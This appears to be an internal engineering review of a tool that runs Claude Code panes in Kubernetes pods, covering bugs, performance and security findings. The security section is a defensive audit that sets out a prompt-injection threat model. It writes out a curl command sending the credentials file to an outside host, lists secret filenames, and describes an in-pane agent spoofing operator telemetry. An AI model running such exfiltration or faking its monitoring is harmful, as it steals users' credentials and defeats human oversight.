## L — Live-validation findings (first real pane sessions)

### [L1] HIGH — Dashboard account picker routes claude-pane sessions to a non-functional credential path
- `internal/tui/dashboard/account_picker.go:181` → `internal/cli/dashboard_connector.go:187` → `client/account.go:148-172`.
- Picking a stored account feeds `params.AnthropicAccountID` into
  `SelectClaudePaneMaterial`, which provisions `cred.ProvisionMaterial` — a
  **setup token wrapped as accessToken-only** `.credentials.json` (observed
  live: 144-byte doc, `oauthKeys: ["accessToken"]`, no refresh/scopes).
  Interactive claude rejects it: **"Not logged in · Run /login"** + "API
  Usage Billing" banner. The "degraded" path is not degraded — it is
  non-functional for the interactive pane (E1 research already established
  interactive claude ignores setup tokens).
- Fix direction: for claude-pane, hide/disable stored-account entries in the
  picker (or map them to a hard error naming the limitation) until the store
  learns full OAuth documents (the recorded 2.1 follow-up). The CLI
  `--account` flag path has the same trap (`internal/cli/claude_remote.go:209`).
  `SelectClaudePaneMaterial`'s doc comment should say "non-functional for
  interactive", not "degraded".

### [L2] MED — Pane replay can render corrupted frames (garbled/overlapping text)
- Observed live on first attach: overlapping header text ("Claude CodClaude
  Code"), stale fragments. Mechanism (from design, needs pinning): the
  runner's scrollback ring (`runner/src/claude-pane.ts:102-136`) evicts
  whole chunks, but chunk boundaries are not escape-sequence boundaries —
  replay-on-attach can start mid-sequence, so cursor-positioning context
  before the cut is lost and the vt emulator composes text at wrong
  positions until the next full repaint.
- Fix direction: force a full repaint after replay (resize jiggle rows±1, or
  synthesize ctrl+L where safe), or trim the replay start to the last
  clear-screen/cursor-home marker in the ring. Verify against a live session
  before choosing.

### [L3] MED — Detached feed opens empty: host event cache has a reader but no writer
- `internal/tui/dashboard/app.go:588-590` seeds the feed from
  `eventCache.LoadEvents`, but `AppendEvent` has **zero production callers**
  — the transcript-stack deletion (a935541) orphaned the write path. The
  `EventCache` interface, `WithEventCache` (model.go:425-441), and
  `indexEventCache`/`CacheWriter` (`internal/cli/sync_support.go:427`) are
  dead weight; feeds for pane sessions seed empty and fill only from
  `after=lastSeq` replay.
- Fix direction: either re-wire feed history (SSE replay from seq 0 on feed
  open — runner SQLite has the full log) and delete the host cache, or
  reconnect the cache write path. Was a known 5.4 ledger note; now confirmed
  still open post-merge.

### [L4] LOW — First live failure modes worth institutional memory
- Stale runner image symptom: pod Failed at boot, `unsupported backend:
  claude-pane` — the image workflow publishes only from main
  (`.depot/workflows/build-runner-image.yml:58`); Depot runs surface as
  GitHub **check-runs**, not Actions runs.
- opencode `CreateContainerConfigError`: cluster `opencode-credentials`
  Secret has only the Zen key (`opencode-api-key`); default provider
  (anthropic) needs `anthropic-api-key` (`internal/k8s/backend.go:182`).
  Fail-closed working as designed; the real fix is
  `openspec/changes/opencode-multi-provider-auth/`.
- Host tooling gotcha: flox exports `KUBECONFIG=dev/local/.kubeconfig`
  (often absent) which masks `~/.kube/config` in flox-activated shells.

### [L5] Design note — external panes as floating modals over the dashboard
- Maintainer idea (2026-07-20): render in-pane clients (claude/opencode) as
  floating modals over the dashboard TUI rather than full-screen takeover —
  keeps fleet context visible around the agent surface. Intersects the §2e
  premium-feel backlog and the pane transport seam (`pane_transport.go`).
  Needs a design pass: sizing/focus semantics, perf (P1 coalescing becomes
  more important when the dashboard renders around a busy pane), and whether
  the vt emulator can render into a sub-region cleanly.

### [L7] MED — Trackpad/wheel scroll does nothing in the claude pane
- Reported live 2026-07-20. Local claude "scrolling" is the terminal
  scrolling its own history (claude runs inline, not alt-screen); the pane
  renders only the emulator's live screen and never exposes the emulator
  scrollback it retains (`external_pane.go:142`). Fix direction: local
  wheel-scroll over the vt scrollback (view offset + snap-back-to-live on
  input/output) when the child hasn't enabled mouse tracking. This inverts
  [P3]: keep the scrollback (capped), don't disable it.

### [L6] Note — public SDK pane surface: transport complete, presentation internal
- Question answered 2026-07-20: `Session.AttachPane`, `PaneStream`
  (Read/Write/Close/Resize), `ErrPanePreempted`/`ErrPaneChildExited`,
  credential material options + `cred.SystemMaterial`/`ProvisionMaterial`
  are all public and pinned (`sdktest/surface_test.go:108-128`). What is NOT
  public: the pane *viewer* (vt emulator wiring, key/paste/mouse encoding —
  `internal/tui/dashboard/external_pane.go`); `tui/terminal` is caps/kitty/
  osc helpers, not a screen widget. External consumers get raw bytes with no
  rendering building block — decide whether a public pane-viewer widget is
  SDK surface (parity bar) or deliberately out.

## P — Performance review (pane byte path; prior E-series fixes all verified intact)

### [P1] HIGH — No chunk coalescing: one full View() per 32 KB transport read
- `internal/tui/dashboard/external_pane.go:217-248`, `app.go:390-391,516-525`.
  Bubble Tea v2 runs View() per message; focused pane = full O(cols×rows)
  `emu.Render()` per chunk; minimized pane = full dashboard View() per chunk
  (background streaming drives renders nobody sees). SSE path solved this
  with the E5 batch-drain; pane path shipped without it.
- Fix: bounded non-blocking drain of `p.out` in `apply` (≤256 chunks/≤1 MB),
  single emulator Write per burst. Keep the reader goroutine as-is.

### [P2] HIGH — Runner pane WS has no backpressure cap (SSE E3 parity gap)
- `runner/src/claude-pane.ts:387-394` (`safeSend` fire-and-forget),
  `server.ts:146-155`. No `bufferedAmount` check, node-pty never paused: a
  client that stops reading without closing TCP grows pod memory at PTY
  output rate until reattach/OOM. SSE caps `writableLength` at 4 MiB and
  destroys wedged clients; pane socket has nothing.
- Fix: mirror E3 — close-with-code over ~4 MiB `bufferedAmount` (client
  reconnects into the scrollback ring), or node-pty flow control.

### [P3] MED — vt emulator retains a 10k-line scrollback the pane never reads
- `external_pane.go:142` → `vt.NewEmulator` → `NewScrollback(10000)`.
  Nothing calls `Scrollback()`; reattach catch-up comes from the runner ring.
  Cost: O(10k) pointer shift per scrolled line at cap + tens-of-MB retention
  per long pane. Moot if claude runs alt-screen — one runtime check first.
- Fix: `SetScrollbackSize(1)` (API rejects 0) or upstream a disable.

### [P4] MED — Pane input is a synchronous network write on the UI goroutine
- `external_pane.go:297-358` → `internal/runner/pane.go:130-137`. Every
  keystroke/paste/mouse event blocks the Bubble Tea loop on
  `conn.WriteMessage`; a stalled forward freezes the whole dashboard
  including ctrl+] detach. Mouse-drag forwarding multiplies frames.
- Fix: small buffered writer goroutine owned by the pane; surface a stream
  error on sustained-full queue instead of blocking.

### [P5] LOW — Replaced pane's reader goroutine can leak on a full channel
- `app.go:517-518` drops stale `ptyOutputMsg` without re-issuing readCmd;
  reader (`external_pane.go:166-187`) has no done signal. If replacement
  happens while `p.out` (≈8 MB max) is full mid-send, goroutine + buffers
  are retained for process lifetime. Rare (flooded channel at close time).
- Fix: reader selects on a done channel closed in close().

### [P6] MED (measure first) — One fresh Node process per observer hook/statusline event
- `runner/src/claude-pane-observer.ts:353-403,408-417`. Every hook forks
  `node hook.js` (~50-150 ms cold start) and exits only after its POST
  (3 s abort). `PreToolUse` sits on the critical path of **every tool call**
  — user-visible latency; `MessageDisplay` + statusline spawn at streaming
  cadence. Measure live cadence, then:
- Fix: fire-and-forget POST (best-effort telemetry already), or append to a
  FIFO/file the runner tails, or a persistent forwarder. Note: a Go-runner
  rewrite replaces the scripts with a runner-binary subcommand (see the
  rewrite doc) — don't over-invest here if that lands.

### [P7] LOW — Feed streaming entry rebuilds the accumulated string per delta
- `internal/tui/dashboard/feed.go:198-201`: `streamBuf.String()`+TrimSpace
  per delta = O(n²) per message + full re-wrap per Update. Bounded by one
  open feed; only touch if the feed feels sluggish on long replies.

Do-not-regress (verified good): runner ScrollbackRing; single-attacher 4001
preemption + lazy spawn; unconditional minimized drain; zero-copy Go WS read
path; grapheme-safe boundary ASCII fast path; the whole E-series SSE
pipeline; O1/C1 lifecycle hygiene.

## S — Security review (trust model: pod = sandbox boundary; in-pane agent = potentially adversarial)

Prior audit criticals all fixed on this tree. Core auth verified solid:
constant-time bearer compare, fail-closed no-token mode, WS upgrade auth
ordered before session-id probe, strict pane-child env allowlist, unified
redaction, clean endpoint deletion (no orphaned routes), runner token never
persisted host-side, ed25519 per-session SSH keys,
`AutomountServiceAccountToken:false`.

### [S1] HIGH — In-pane agent can exfiltrate the full refresh-capable Max credential over permissive 443 egress
- Chain: `client/cred/system.go:43-68` (full access+refresh harvested) →
  `internal/k8s/backend.go:398-401,1986-2008` (per-session Secret) →
  `runner/src/claude-config.ts:98-119` (materialized 0600 on PVC) →
  `claude-pane.ts:159` (CLAUDE_CONFIG_DIR in child allowlist — the agent
  and any Bash tool it runs can read the file) →
  `k8s/networkpolicy-egress-allow.yaml:55-66` (TCP 443 to 0.0.0.0/0 minus
  RFC1918). Prompt injection → `curl --data @$CLAUDE_CONFIG_DIR/.credentials.json`
  to any public host; the credential outlives the session. Compounded by
  `claude-pane-observer.ts:494-497` disabling claude's native sandbox (by
  design, so hooks fire). The env allowlist cannot protect a credential the
  agent must read as a file — egress is the only barrier.
- Fix: ship a tightened egress example (FQDN allowlist `api.anthropic.com`
  + per-backend hosts; Cilium `toFQDNs` shape); SECURITY.md states plainly
  that broad-egress does not contain credential exfil; longer-term prefer a
  short-lived/scoped credential where the product allows. NOTE: the
  opencode-multi-provider-auth change widens this to N providers — its seed
  filter is part of the mitigation.

### [S2] MED — Project-sync secret ignores are extension-based; common credential *filenames* sync into the pod
- `internal/sync/sync.go:350-368`: blocks `.env*`, `*.pem`, `*.key`,
  `*.p12`, `*.pfx` but not `.netrc`, `.npmrc`, `.git-credentials`,
  `.aws/credentials`, `service-account*.json`, `id_rsa`/`id_ed25519`.
  Two-way project sync delivers them into the untrusted pod (then [S1]).
- Fix: extend `securityIgnores` with the filename patterns; document the
  "no secret files in the project dir" expectation.

### [S3] LOW — In-pane agent can read its observer token and spoof session telemetry / stall the reaper
- `claude-pane-observer.ts:449-452` (token 0600 under CLAUDE_CONFIG_DIR),
  `server.ts:297-311` (observer routes accept it). Same-session scope only:
  fabricated tool/permission/usage events on the operator dashboard; held
  synthetic-busy bounded by `SYNTHETIC_BUSY_STALE_MS` (5 min).
- Fix: accept as a documented consequence (threat-model note: don't
  over-trust a claude-pane live transcript); optionally tag
  observer-originated events distinctly.

### [S4] LOW — `runner/src/grants.ts` is dead code post-deletion
- No importers, no route. Delete in a hygiene commit (repo-hygiene rule).

### [S5] INFO — Pane WS lacks maxPayload/geometry bounds (`server.ts:174,119-134`); authenticated-only so no privilege gain. Set sane bounds when touching the file.

### [S6] INFO — Runner container runs as root (documented deferral)
- `internal/k8s/backend.go:1572-1582,1667-1673`: caps dropped + seccomp but
  no runAsNonRoot; PSA `baseline` permits it (namespace warns `restricted`).
  Tracked so it isn't forgotten.

No code-vs-manifest disagreements found; reaper RBAC is least-privilege.
